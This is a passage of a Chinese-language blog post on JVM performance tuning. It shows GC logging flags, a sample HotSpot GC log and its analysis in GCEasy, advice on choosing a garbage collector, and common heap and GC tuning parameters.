class=\"line\">\\-XX:+PrintGCDateStamps  </span><br><span class=\"line\">\\-XX:+PrintGCTimeStamps  </span><br><span class=\"line\">\\-XX:+PrintGCCause  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>‐Xloggc参数：指定gc日志的保存地址。这里指定的是当前目录，文件名以gc-+时间戳.log打印。%t表示时间戳</p>\n</li>\n<li><p>‐XX:+PrintGCDetails：在日志中打印GC详情。</p>\n</li>\n<li><p>‐XX:+PrintGCDateStamps：在日志中打印GC的时间</p>\n</li>\n<li><p>‐XX:+PrintGCTimeStamps：在日志中打印GC耗时</p>\n</li>\n<li><p>‐XX:+PrintGCCause ： [这个参数没查到]</p>\n</li>\n<li><p>‐XX:+UseGCLogFileRotation：这个参数表示以滚动文件的形式打印日志</p>\n</li>\n<li><p>‐XX:NumberOfGCLogFiles：GC日志文件的最大个数，这里设置10个</p>\n</li>\n<li><p>‐XX:GCLogFileSize：GC日志每个文件的最大容量，这里是100M</p>\n</li>\n</ul>\n<p>我们把日志下载到Downloads文件夹下了。以下便是GC日志的全部内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Java HotSpot(TM) 64-Bit Server VM (25.202-b08) for bsd-amd64 JRE (1.8.0\\_202-b08), built on Dec 15 2018 20:16:16 by &quot;java\\_re&quot; with gcc 4.2.1 (Based on Apple Inc. build 5658) (LLVM build 2336.11.00)  </span><br><span class=\"line\">Memory: 4k page, physical 16777216k(1745536k free)  </span><br><span class=\"line\">/proc/meminfo:  </span><br><span class=\"line\">CommandLine flags: -XX:-BytecodeVerificationLocal -XX:-BytecodeVerificationRemote -XX:InitialHeapSize=268435456 -XX:+ManagementServer -XX:MaxHeapSize=4294967296 -XX:+PrintGC -XX:+PrintGCCause -XX:+PrintGCDateStamps -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:TieredStopAtLevel=1 -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseParallelGC   </span><br><span class=\"line\">2022-01-12T15:02:37.044-0800: 0.839: \\[GC (Allocation Failure) \\[PSYoungGen: 65536K-&gt;4400K(76288K)\\] 65536K-&gt;4416K(251392K), 0.0043915 secs\\] \\[Times: user=0.01 sys=0.00, real=0.00 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:37.308-0800: 1.103: \\[GC (Allocation Failure) \\[PSYoungGen: 69936K-&gt;4959K(76288K)\\] 69952K-&gt;5047K(251392K), 0.0046449 secs\\] \\[Times: user=0.02 sys=0.01, real=0.01 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:37.625-0800: 1.420: \\[GC (Allocation Failure) \\[PSYoungGen: 70495K-&gt;7467K(76288K)\\] 70583K-&gt;7563K(251392K), 0.0051392 secs\\] \\[Times: user=0.02 sys=0.00, real=0.01 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:37.831-0800: 1.627: \\[GC (Allocation Failure) \\[PSYoungGen: 73003K-&gt;9356K(141824K)\\] 73099K-&gt;9460K(316928K), 0.0072596 secs\\] \\[Times: user=0.03 sys=0.01, real=0.00 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:37.869-0800: 1.664: \\[GC (Metadata GC Threshold) \\[PSYoungGen: 22322K-&gt;7049K(141824K)\\] 22426K-&gt;7161K(316928K), 0.0057809 secs\\] \\[Times: user=0.02 sys=0.00, real=0.01 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:37.875-0800: 1.670: \\[Full GC (Metadata GC Threshold) \\[PSYoungGen: 7049K-&gt;0K(141824K)\\] \\[ParOldGen: 112K-&gt;6873K(87040K)\\] 7161K-&gt;6873K(228864K), \\[Metaspace: 20573K-&gt;20571K(1067008K)\\], 0.0237404 secs\\] \\[Times: user=0.09 sys=0.01, real=0.02 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:38.392-0800: 2.188: \\[GC (Allocation Failure) \\[PSYoungGen: 131072K-&gt;7194K(236032K)\\] 137945K-&gt;14075K(323072K), 0.0054542 secs\\] \\[Times: user=0.01 sys=0.01, real=0.00 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:39.850-0800: 3.646: \\[GC (Allocation Failure) \\[PSYoungGen: 235546K-&gt;9697K(270336K)\\] 242427K-&gt;20203K(357376K), 0.0092838 secs\\] \\[Times: user=0.02 sys=0.01, real=0.01 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:40.479-0800: 4.274: \\[GC (Metadata GC Threshold) \\[PSYoungGen: 179780K-&gt;12779K(397312K)\\] 190286K-&gt;25839K(484352K), 0.0117953 secs\\] \\[Times: user=0.04 sys=0.01, real=0.02 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:40.491-0800: 4.286: \\[Full GC (Metadata GC Threshold) \\[PSYoungGen: 12779K-&gt;0K(397312K)\\] \\[ParOldGen: 13059K-&gt;21448K(132096K)\\] 25839K-&gt;21448K(529408K), \\[Metaspace: 34068K-&gt;34068K(1079296K)\\], 0.0437361 secs\\] \\[Times: user=0.16 sys=0.01, real=0.04 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:42.177-0800: 5.972: \\[GC (Allocation Failure) \\[PSYoungGen: 384512K-&gt;13185K(399872K)\\] 405960K-&gt;34641K(531968K), 0.0115070 secs\\] \\[Times: user=0.04 sys=0.01, real=0.01 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:43.010-0800: 6.806: \\[GC (Allocation Failure) \\[PSYoungGen: 397697K-&gt;16864K(530432K)\\] 419153K-&gt;58461K(662528K), 0.0248406 secs\\] \\[Times: user=0.04 sys=0.02, real=0.02 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:44.338-0800: 8.133: \\[GC (Allocation Failure) \\[PSYoungGen: 530400K-&gt;26083K(539648K)\\] 571997K-&gt;86488K(671744K), 0.0302789 secs\\] \\[Times: user=0.06 sys=0.02, real=0.03 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:45.800-0800: 9.595: \\[GC (Allocation Failure) \\[PSYoungGen: 539619K-&gt;32647K(733696K)\\] 600024K-&gt;99769K(865792K), 0.0280332 secs\\] \\[Times: user=0.04 sys=0.02, real=0.02 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:47.765-0800: 11.560: \\[GC (Allocation Failure) \\[PSYoungGen: 729479K-&gt;41445K(738304K)\\] 796601K-&gt;124936K(870400K), 0.0370655 secs\\] \\[Times: user=0.04 sys=0.02, real=0.04 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:49.620-0800: 13.415: \\[GC (Allocation Failure) \\[PSYoungGen: 738277K-&gt;26677K(974848K)\\] 821768K-&gt;114930K(1106944K), 0.0270382 secs\\] \\[Times: user=0.05 sys=0.02, real=0.02 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:52.146-0800: 15.942: \\[GC (Allocation Failure) \\[PSYoungGen: 959541K-&gt;17569K(985600K)\\] 1047794K-&gt;110447K(1117696K), 0.0274985 secs\\] \\[Times: user=0.05 sys=0.01, real=0.03 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:54.110-0800: 17.905: \\[GC (Allocation Failure) \\[PSYoungGen: 950433K-&gt;10240K(1236480K)\\] 1043311K-&gt;109662K(1368576K), 0.0146713 secs\\] \\[Times: user=0.05 sys=0.01, real=0.01 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:54.692-0800: 18.487: \\[GC (Metadata GC Threshold) \\[PSYoungGen: 264005K-&gt;3360K(1259520K)\\] 363427K-&gt;109573K(1391616K), 0.0086901 secs\\] \\[Times: user=0.03 sys=0.01, real=0.01 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:54.701-0800: 18.496: \\[Full GC (Metadata GC Threshold) \\[PSYoungGen: 3360K-&gt;0K(1259520K)\\] \\[ParOldGen: 106213K-&gt;54092K(208384K)\\] 109573K-&gt;54092K(1467904K), \\[Metaspace: 56204K-&gt;56204K(1101824K)\\], 0.1487173 secs\\] \\[Times: user=0.69 sys=0.01, real=0.14 secs\\]   </span><br><span class=\"line\">2022-01-12T15:02:57.787-0800: 21.583: \\[GC (Allocation Failure) \\[PSYoungGen: 1209856K-&gt;49146K(1321984K)\\] 1263948K-&gt;116260K(1530368K), 0.0339265 secs\\] \\[Times: user=0.05 sys=0.01, real=0.04 secs\\]   </span><br><span class=\"line\">2022-01-12T15:03:16.198-0800: 39.994: \\[GC (Allocation Failure) \\[PSYoungGen: 1321978K-&gt;29589K(1335296K)\\] 1389092K-&gt;101049K(1543680K), 0.0214759 secs\\] \\[Times: user=0.06 sys=0.01, real=0.03 secs\\]   </span><br><span class=\"line\">2022-01-12T15:03:19.021-0800: 42.816: \\[GC (GCLocker Initiated GC) \\[PSYoungGen: 1302421K-&gt;60915K(1280512K)\\] 1373881K-&gt;180735K(1488896K), 0.0482886 secs\\] \\[Times: user=0.08 sys=0.01, real=0.05 secs\\]   </span><br><span class=\"line\">2022-01-12T15:03:21.847-0800: 45.642: \\[GC (Allocation Failure) \\[PSYoungGen: 1280499K-&gt;89087K(1308672K)\\] 1400321K-&gt;228379K(1517056K), 0.0336500 secs\\] \\[Times: user=0.10 sys=0.01, real=0.04 secs\\]   </span><br><span class=\"line\">2022-01-12T15:03:24.516-0800: 48.311: \\[GC (Allocation Failure) \\[PSYoungGen: 1308671K-&gt;67295K(1257472K)\\] 1447963K-&gt;225652K(1465856K), 0.0381420 secs\\] \\[Times: user=0.07 sys=0.02, real=0.04 secs\\]  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"指标分析第二步：导入分析工具，尽心分析\"><a href=\"#指标分析第二步：导入分析工具，尽心分析\" class=\"headerlink\" title=\"指标分析第二步：导入分析工具，尽心分析\"></a>指标分析第二步：导入分析工具，尽心分析</h3><p>打开gceasy.io网站，并选择本地的gc文件，然后点击分析。</p>\n<p>（分析的速度根据日志的多少而定，可能会比较慢）</p>\n<p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/1.png\"><br>接下来看看分析结果：</p>\n<h3 id=\"JVM-memory-size-JVM内存大小\"><a href=\"#JVM-memory-size-JVM内存大小\" class=\"headerlink\" title=\"JVM memory size (JVM内存大小)\"></a>JVM memory size (JVM内存大小)</h3><p>GCEasy是一款非常好用的在线分析GC日志的工具，打开官网，直接上传gc日志，也可以更加上门的要求进行压缩上传。<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/2.png\"><br>这里的Allocated和Peak分别表示可分配空间和峰值</p>\n<ul>\n<li><p><strong>Allocated</strong>：可分配空间大小。</p>\n<p><strong>具体含义如下</strong>：指示为每一代分配的大小。此数据点是从GC日志收集的，因此它可能与JVM系统属性指定的大小相匹配，也可能不匹配。假设您已将总堆大小配置为2gb，而在运行时，如果JVM只分配了1gb，那么在本报告中，您将看到分配的大小仅为1gb</p>\n</li>\n<li><p><strong>Peak：</strong> 分配的峰值。</p>\n<p><strong>具体含义如下</strong>：每一代的峰值内存利用率。通常它不会超过分配的大小。然而，在少数情况下，我们也看到峰值利用率超出了分配的大小，特别是在G1 GC中</p>\n</li>\n</ul>\n<p>JVM memory size ，GCEasy展示了年轻代、老年代、元空间。JVM给分配的大小和程序运行过程中使用的峰值大小。</p>\n<p>从JVM memory size展示的信息，我们可以判断是否需要做下面的几件事情。</p>\n<ul>\n<li><p>是否需要修改JVM内存（-Xms、-Xmx、-Xmn…）相关配置，比如年轻代和老年代峰值远远小于分配的大小，这个时候我们可以适当的减小内存设置。</p>\n</li>\n<li><p>是否需要调整年轻代和老年代的比例(-XX:NewSize(-Xns)、-XX:MaxNewSize(-Xmn)、-XX:SurvivorRatio&#x3D;8)。比如老年大的峰值一直小于老年代申请的内存，这个时候我们可以稍微多分点空间给年轻代。</p>\n</li>\n<li><p>是否需要修改元空间(XX:MetaspaceSize，-XX:MaxMetaspaceSize)相关设置。 <strong>年轻代，老年代属于堆区，元空间属于非堆区（直接对接的是机器的内存）</strong></p>\n</li>\n</ul>\n<h3 id=\"Key-Performance-Indicatiors（关键指标）\"><a href=\"#Key-Performance-Indicatiors（关键指标）\" class=\"headerlink\" title=\"Key Performance Indicatiors（关键指标）\"></a>Key Performance Indicatiors（关键指标）</h3><p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/3.png\"></p>\n<ul>\n<li><p>Throughput：吞吐量。</p>\n<p>指的是处理实际事务花费的时间与GC花费的时间的百分比。这个值越高越好</p>\n</li>\n<li><p>Latency：</p>\n<p>延迟情况。这里的延迟情况是指的GC过程花费的时间。具体含义如上图</p>\n</li>\n</ul>\n<p>Throughput表示的是吞吐量 Latency表示响应时间 Avg Pause GC Time 平均GC时间 Max Pause GC TIme 最大GC时间</p>\n<p>Key Performance Indicators 给我们展示了GC吞吐量（应用程序线程用时占程序总用时的比例，越高越好），每次GC的平均耗时（建议控制在50ms以下），GC最长耗时，每个时间段的GC次数及占比信息。</p>\n<p>通过Key Performance Indicators显示的信息里面，我们需要关注下面几个问题：</p>\n<ul>\n<li><p>吞吐量，应用花在非GC上的时间百分比（引用花在生产任务上的百分比）。所以吞吐量越高越好。</p>\n</li>\n<li><p>每次GC的平均耗时。越小越好，建议50ms以下。</p>\n</li>\n<li><p>GC最长耗时。越小越好。如果你的应用是一个后台程序，并且任何请求不超过10秒，那么GC最长耗时就不能超过10秒。</p>\n</li>\n</ul>\n<h3 id=\"Interactive-Graphs-交互图\"><a href=\"#Interactive-Graphs-交互图\" class=\"headerlink\" title=\"Interactive Graphs(交互图)\"></a>Interactive Graphs(交互图)</h3><p>Interactive Graphs 展示了</p>\n<p><strong>Heap after GC</strong>：GC之后堆的使用情况 <strong>Heap before GC</strong>：GC之前堆的使用情况 <strong>GC Duration</strong>：GC持续时间 <strong>Reclaimed Bytes</strong>：GC回收掉的垃圾对象的内存大小 <strong>Young Gen</strong>：年轻代堆的使用情况 <strong>Old Gen</strong>：老年代堆的使用情况 <strong>Meta Space</strong>：元空间的使用情况 <strong>A &amp; P</strong>：每次GC的时候堆内存分配和晋升情况。其中红色的线表示每次GC的时候年轻代里面有多少内存(对象)晋升到了老年代。</p>\n<p>第一部分是Heap after GC，GC后堆的内存图，堆是用来存储对象的，从图中可以看出，随着GC的进行，垃圾回收器把对象都回收掉了，因此堆的大小逐渐增大。<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/4.png\"><br>第二部分是Heap before GC，这是GC前堆的使用率，可以看出随着程序的运行，堆使用率越来越高，堆被对象占用的内存越来越大。<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/5.png\"><br>第三部分是GC Duration Time，就是GC持续时间。一个GC事件的发生具有多个阶段，而不同的垃圾回收器又有不同的阶段，这里展示不作细分。这些阶段（例如并发标记，并发清除等）与程序线程一起并发运行，此时不会暂停程序线程。但是某些阶段（例如初始标记，清除等）会暂停整个应用程序，所以此图标描述的仅暂停阶段所花费的时间。<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/6.png\"><br>第四部分表示的是GC回收掉的垃圾对象的内存大小。<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/7.png\"><br>第五部分表示的是Young Gen，年轻代的内存分配情况。对象都是朝生夕死，年轻代存放的就是刚刚产生的对象，每进行一次GC，都会GC掉很多垃圾对象，剩下的就是右GC Root关联的对象，这些对象会年龄会逐渐增加，达到了一定阈值就会晋升为老年代的对象。可以看到before GC表示的图线随着时间的进行逐渐增大，也就是年轻代中对象越来越多，而GC事件发生后，年轻代中对象就会减少，也就是after GC图线表示的内存变化趋势。<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/8.png\"><br>第六部分是Old Gen，表示的是老年代的内存分配情况。细心的读者会发现，为啥一开始before GC的内存大小比after GC的内存分配要少呢？这里得先知道老年代存放的都是年龄大的对象，意思就是经过了多次GC都没有被GC掉的对象，就会晋升为老年代的对象。所以这就解释了为啥after GC内存要比before GC内存要大，因为每次GC过后，都会有年轻代的对象晋升为老年代对象。<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/9.png\"><br>第七部分是每次GC的时候堆内存分配和晋升情况。其中红色的线表示每次GC的时候年轻代里面有多少内存(对象)晋升到了老年代。<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/10.png\"></p>\n<h3 id=\"GC-Statistics-GC统计信息\"><a href=\"#GC-Statistics-GC统计信息\" class=\"headerlink\" title=\"GC Statistics(GC统计信息)\"></a>GC Statistics(GC统计信息)</h3><p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/11.png\"><br>每种GC总共回收了多少内存、总共用了多长时间、平均时间、以及每种GC的单独统计信息啥的。</p>\n<h3 id=\"Object-Stats-对象的一些统计信息\"><a href=\"#Object-Stats-对象的一些统计信息\" class=\"headerlink\" title=\"Object Stats(对象的一些统计信息)\"></a>Object Stats(对象的一些统计信息)</h3><p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/12.png\"></p>\n<h3 id=\"GC-Causes-GC的原因信息\"><a href=\"#GC-Causes-GC的原因信息\" class=\"headerlink\" title=\"GC Causes(GC的原因信息)\"></a>GC Causes(GC的原因信息)</h3><p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/13.png\"></p>\n<h3 id=\"Memory-Leak\"><a href=\"#Memory-Leak\" class=\"headerlink\" title=\"Memory Leak\"></a>Memory Leak</h3><p>由于记录的程序没有内存泄漏，所以这里就没有内存泄漏的日志信息。</p>\n<p>此处可以诊断8种OOM中的5种（Java堆内存溢出，超出GC开销限制，请求数组大小超过JVM限制，Permgen空间，元空间）。</p>\n<h2 id=\"四：JVM-常用配置策略\"><a href=\"#四：JVM-常用配置策略\" class=\"headerlink\" title=\"四：JVM 常用配置策略\"></a>四：JVM 常用配置策略</h2><h3 id=\"垃圾回收器的选择\"><a href=\"#垃圾回收器的选择\" class=\"headerlink\" title=\"垃圾回收器的选择\"></a>垃圾回收器的选择</h3><p>选择垃圾回收器时，应根据CPU核心数、关注点（吞吐量或用户停顿时间）以及JDK版本等因素做出合适的选择，以提高应用程序的性能和稳定性。</p>\n<ul>\n<li><p><strong>CPU单核：</strong></p>\n<p>当系统仅有单核CPU时，Serial垃圾收集器是最佳选择。</p>\n<p>由于单核系统的性能瓶颈主要集中在单一处理器上，使用Serial垃圾收集器能够简化垃圾回收的过程，提高系统的整体性能。</p>\n</li>\n<li><p><strong>CPU多核：关注吞吐量</strong></p>\n<p>对于多核CPU且关注系统吞吐量的情况，推荐选择Parallel Scavenge（PS）加 Parallel Old（PO）的组合。</p>\n<p>这种组合利用了多核CPU的并行处理能力，通过并行处理新生代和老年代的垃圾收集，以提高系统的吞吐量和整体性能。</p>\n</li>\n<li><p><strong>CPU多核，关注用户停顿时间，JDK版本1.6或1.7：</strong></p>\n<p>如果系统是多核CPU，并且更关注用户停顿时间，特别是在JDK版本为1.6或1.7的情况下，推荐选择Concurrent Mark-Sweep（CMS）垃圾收集器。</p>\n<p>CMS垃圾收集器以减少应用程序停顿时间为目标，通过与应用程序线程并发执行部分垃圾回收操作，从而降低了GC造成的停顿时间，提高了系统的响应速度和用户体验。</p>\n</li>\n<li><p><strong>CPU多核，关注用户停顿时间，JDK1.8及以上，JVM可用内存6G以上：</strong></p>\n<p>对于JDK版本为1.8及以上，并且系统具备充足的内存资源（6G及以上），且依然关注用户停顿时间的情况，推荐选择Garbage-First（G1）垃圾收集器。</p>\n<p>G1垃圾收集器是一种面向服务端应用的垃圾收集器，具有高效的垃圾回收、可预测的停顿时间和良好的内存整理能力，适用于对用户停顿时间有较高要求的应用场景。</p>\n</li>\n</ul>\n<p><strong>垃圾回收器的选择 的切换配置：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//设置Serial垃圾收集器（新生代）  </span><br><span class=\"line\"> 开启：-XX:+UseSerialGC  </span><br><span class=\"line\">   </span><br><span class=\"line\"> //设置PS+PO,新生代使用功能Parallel Scavenge 老年代将会使用Parallel Old收集器  </span><br><span class=\"line\"> 开启 -XX:+UseParallelOldGC  </span><br><span class=\"line\">   </span><br><span class=\"line\"> //CMS垃圾收集器（老年代）  </span><br><span class=\"line\"> 开启 -XX:+UseConcMarkSweepGC  </span><br><span class=\"line\">   </span><br><span class=\"line\"> //设置G1垃圾收集器  </span><br><span class=\"line\"> 开启 -XX:+UseG1GC  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"JVM参数常用原则\"><a href=\"#JVM参数常用原则\" class=\"headerlink\" title=\"JVM参数常用原则\"></a>JVM参数常用原则</h3><ul>\n<li><p>对于JVM堆的设置</p>\n<p>通常我们会使用 <strong>-Xms</strong> 和 <strong>-Xmx</strong> 来设定最小和最大堆大小，将它们设置为相同的值可以防止垃圾收集器在堆大小之间进行收缩，从而减少额外的时间消耗。</p>\n</li>\n<li><p>年轻代和年老代的大小将根据默认比例（通常为1：2）分配堆内存。</p>\n<p>我们可以通过调整 <strong>-XX:NewRatio</strong> 参数来调整它们之间的比例，</p>\n<p>也可以通过 <strong>-XX:NewSize</strong> 和 <strong>-XX:MaxNewSize</strong> 来设置年轻代的绝对大小。</p>\n<p>为了防止年轻代堆大小的调整，通常将 <strong>-XX:NewSize</strong> 和 <strong>-XX:MaxNewSize</strong> 设置为相同大小。</p>\n</li>\n<li><p>年轻代和年老代大小的合理设置没有标准答案，因此调优时需要观察它们大小变化对系统的影响。</p>\n<p>更大的年轻代会延长普通GC周期但增加每次GC的时间，而更小的年老代会导致更频繁的Full GC。</p>\n<p>选择应根据应用程序对象生命周期的分布情况，例如，如果应用存在大量的临时对象，则应选择更大的年轻代；如果存在大量的持久对象，则应适当增大年老代。</p>\n<p>观察应用一段时间后，根据峰值时年老代所占内存来调整年轻代的大小，但应保留年老代至少1&#x2F;3的增长空间。</p>\n</li>\n<li><p>在配置较好的机器上（如多核、大内存），可以为年老代选择并行收集算法，使用<strong>XX:+UseParallelOldGC</strong>，默认为串行收集。</p>\n</li>\n<li><p>线程堆栈的设置：每个线程默认会分配1M的堆栈空间，用于存放栈帧、调用参数、局部变量等。</p>\n<p>对于大多数应用来说，这个默认值过大，一般可以将其减小至256K。</p>\n<p>减小线程堆栈大小可以在内存不变的情况下创建更多线程，但这也受限于操作系统的支持。</p>\n</li>\n</ul>\n<h2 id=\"五：常见调优策略\"><a href=\"#五：常见调优策略\" class=\"headerlink\" title=\"五：常见调优策略\"></a>五：常见调优策略</h2><h3 id=\"5-1-调整内存大小\"><a href=\"#5-1-调整内存大小\" class=\"headerlink\" title=\"5.1 调整内存大小\"></a>5.1 调整内存大小</h3><ul>\n<li><p>现象：垃圾收集频率非常频繁</p>\n</li>\n<li><p>措施：考虑增加堆内存大小。</p>\n</li>\n<li><p>说明：</p>\n</li>\n</ul>\n<p>频繁的垃圾收集通常是由于内存过小，导致需要不断进行垃圾收集以释放空间来容纳新对象。</p>\n<p>因此，增加堆内存大小可以显著降低垃圾收集的频率。</p>\n<p>需要注意的是，如果垃圾收集次数虽然频繁但每次回收的对象却很少，那么问题可能不在于内存过小，而是由于内存泄漏导致的对象无法被正确回收，从而引发了频繁的垃圾收集。</p>\n<p>在这种情况下，调整内存大小可能无法解决问题，而需要对代码进行进一步的分析和调试。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//设置堆初始值  </span><br><span class=\"line\">指令1：-Xms2g  </span><br><span class=\"line\">指令2：-XX:InitialHeapSize=2048m  </span><br><span class=\"line\">  </span><br><span class=\"line\">//设置堆区最大值  </span><br><span class=\"line\">指令1：\\`-Xmx2g\\`   </span><br><span class=\"line\">指令2： -XX:MaxHeapSize=2048m  </span><br><span class=\"line\">  </span><br><span class=\"line\">//新生代内存配置  </span><br><span class=\"line\">指令1：-Xmn512m  </span><br><span class=\"line\">指令2：-XX:MaxNewSize=512m</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-2-调整GC触发时机\"><a href=\"#5-2-调整GC触发时机\" class=\"headerlink\" title=\"5.2 调整GC触发时机\"></a>5.2 调整GC触发时机</h3><ul>\n<li><p>现象：</p>\n<p>在CMS和G1垃圾回收器下，频繁发生Full GC，导致程序严重卡顿。</p>\n</li>\n<li><p>说明：</p>\n</li>\n</ul>\n<p>在G1和CMS的部分GC阶段是并发进行的，即业务线程和垃圾收集线程同时运行。</p>\n<p>这意味着在垃圾收集过程中，业务线程可能会生成新的对象。</p>\n<p>因此，在进行垃圾收集时，需要预留一部分内存空间来容纳新产生的对象。</p>\n<p>如果此时内存空间不足以容纳新对象，JVM会停止并发收集，暂停所有业务线程（STW），以确保垃圾收集正常进行。</p>\n<p>可以通过调整GC的触发时机（例如在老年代占用60%时触发GC）来预留足够的空间给业务线程创建的对象。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//使用多少比例的老年代后开始CMS收集，默认是68%，如果频繁发生SerialOld卡顿，应该调小  </span><br><span class=\"line\">-XX:CMSInitiatingOccupancyFraction  </span><br><span class=\"line\">  </span><br><span class=\"line\">//G1混合垃圾回收周期中要包括的旧区域设置占用率阈值。默认占用率为 65%  </span><br><span class=\"line\">-XX:G1MixedGCLiveThresholdPercent=65 </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-3-调整对象晋升到老年代年龄阈值\"><a href=\"#5-3-调整对象晋升到老年代年龄阈值\" class=\"headerlink\" title=\"5.3 调整对象晋升到老年代年龄阈值\"></a>5.3 调整对象晋升到老年代年龄阈值</h3><ul>\n<li><p>现象：</p>\n<p>老年代发生频繁的GC，每次清理回收大量对象。</p>\n</li>\n<li><p>说明：</p>\n</li>\n</ul>\n<p>当对象的晋升年龄设定较低时，新生代中的对象很快就会被晋升到老年代。</p>\n<p>这导致老年代中对象数量增多，其中很多对象实际上在短时间内就可能被回收。</p>\n<p>通过调整对象的晋升年龄，可以减少过早进入老年代的对象数量，从而减少老年代的空间压力和频繁的GC。</p>\n<p>注意：提高晋升年龄虽然可以减缓老年代的压力，但同时可能会增加新生代的GC频率，因为对象在新生代的停留时间变长。</p>\n<p>此外，新生代中频繁复制这些对象可能会导致新生代的GC时间也相应增长。</p>\n<p>在调整晋升年龄时，应综合考虑新生代和老年代的GC性能，以达到最优的系统性能平衡。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">// 进入老年代最小的GC年龄,年轻代对象转换为老年代对象最小年龄值，默认值7  </span><br><span class=\"line\">-XX:InitialTenuringThreshol=7 </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-4-调整大对象进入老年代的标准\"><a href=\"#5-4-调整大对象进入老年代的标准\" class=\"headerlink\" title=\"5.4 调整大对象进入老年代的标准\"></a>5.4 调整大对象进入老年代的标准</h3><ul>\n<li><p>现象：</p>\n<p>老年代经常发生频繁的GC，每次回收大量对象，而这些对象的体积都相对较大。</p>\n</li>\n<li><p>说明：</p>\n</li>\n</ul>\n<p>大量大对象直接分配到老年代会快速填满老年代空间，导致老年代频繁GC。</p>\n<p>为解决此问题，可调整大对象直接进入老年代的标准。</p>\n<p>需要注意：将大对象调整为直接进入老年代后，可能会增加新生代的GC频率和时间。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//新生代可容纳的最大对象,大于则直接会分配到老年代，0代表没有限制。  </span><br><span class=\"line\"> -XX:PretenureSizeThreshold=1000000 </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-5-调整内存区域大小比率\"><a href=\"#5-5-调整内存区域大小比率\" class=\"headerlink\" title=\"5.5 调整内存区域大小比率\"></a>5.5 调整内存区域大小比率</h3><ul>\n<li><p>现象：</p>\n<p>某一内存区域频繁发生GC，而其他区域的GC表现正常。</p>\n</li>\n<li><p>说明：</p>\n</li>\n</ul>\n<p>频繁的GC可能是由于对应区域的空间不足所致，需要不断进行GC以释放空间。</p>\n<p>在JVM堆内存无法增加的情况下，可以考虑调整对应区域的大小比率。</p>\n<p>注意：尽管频繁的GC可能是由于空间不足造成的，但也有可能是因为内存泄漏导致内存无法回收，进而引发GC频繁。</p>\n<p>因此，在调整内存区域大小比率之前，需要仔细分析是否存在内存泄漏问题。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">// survivor区和Eden区大小比率  </span><br><span class=\"line\">指令：-XX:SurvivorRatio=6  //S区和Eden区占新生代比率为1:6,两个S区2:6  </span><br><span class=\"line\">  </span><br><span class=\"line\">// 新生代和老年代的占比  </span><br><span 